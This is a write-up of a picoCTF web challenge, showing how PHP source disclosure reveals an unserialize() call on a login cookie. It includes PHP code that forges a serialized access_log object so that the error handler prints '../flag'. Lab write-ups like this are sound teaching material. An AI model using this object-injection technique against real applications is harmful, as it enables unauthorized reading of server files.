## Description
Try to recover the flag stored on this website http://mercury.picoctf.net:14804/

## Hints
The flag is at ../flag
## Approach
1. By checking `robots.txt`, we can find `Disallow: /admin.phps`, this means we can append `s` to other pages to see the source code.

2. Check `/index.phps`, we can find
```
setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
```
It looks like this site use the cookie `login` to determine the users. Besides, the `login` will be encoded. However, if  randomly creating a login cookie, we can't get anything useful.

3. Try to access `/authentication.phps` we found in `index.phps`.

4. We can find `require_once("cookie.php");` here, it means `cookie.php` will be embedded into `authentication.php`, like the code below:
```
class access_log{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
.
.
.
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
.
.
.
```

5. We can find `access_log` can access log, which is our goal. So, now we want to do is to use `access_log` to retrice `../flag`

6. Also, we can find `die("Deserialization error. ".$perm);`. This is a good chance to print out the file.

7. Therefore, we want to make 
```
$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])))
```
become 
```
$perm = new access_log("../flag")
```
and then do something error to execute `die("Deserialization error. ".$perm)`;,

8. We can easily get the value of cookie `login` by the PHP code below:
```
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

echo(urlencode(base64_encode(serialize(new access_log("../flag")))));
```

9. Add cookie `login` with value, which we got by the above code.

10. So, when running 
```
$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])))
```
In fact, it is
```
$perm = new access_log("../flag")
```
And then when running `$g = $perm->is_guest();`, it will throw an error because the `class access_log` doesn't have the function `is_guest`.

11. `die("Deserialization error. ".$perm);` will print string `$perm.__toString()`, which will read the file we just defined in constructor.

